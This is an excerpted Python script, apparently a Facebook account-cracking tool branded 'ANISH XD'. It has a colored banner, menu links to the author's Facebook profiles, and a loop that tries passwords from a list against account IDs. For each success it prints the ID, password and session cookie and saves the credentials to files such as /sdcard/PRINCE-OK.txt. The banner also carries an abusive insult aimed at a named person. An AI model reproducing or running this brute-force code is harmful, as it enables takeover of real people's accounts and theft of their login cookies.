...
def ud():
    ...
    if opt == '1':
        ...
        os.system('xdg-open https://www.facebook.com/anishthedecent0183 ')
...
def FD():
    ...
    print('\x1b[1;33m [1] FOLLOW MY FB ACCOUNT')
    ...
    if opt == '1':
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100081158348111')
...
def o():
    ...
    jalan(' \x1b[1;32m[3] \x1b[1;32mFOLLOW DEPRESSED PRINCE ')

    jalan(' \x1b[1;32m[4] \x1b[1;32mFOLLOW PRINCE ')
...
\033[1;37m================= \33[32;45mANISH XD \33[0;m =====================

\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mANISH\33[0;m\033[1;32m && \033[1;33mANISH\33[0;m

\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m ANISH

\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mANISH

\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE

\033[1;32m     \033[1;35mTEAM         :  \033[1;35mANISH THE NITESH FUCKER INSIDE

\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3

\033[1;37m================= \33[32;45mANISH\33[0;m =====================

 

       \33[37;41m\t WELLCOME TO NITESH FUCKER ANISH XD TOOL\33[0;m
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;32m(PRINCE-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/PRINCE-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print('    \33[1;30m(SAMI-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/SAMI-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write('\r     %s[PRINCE×PRINCE] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
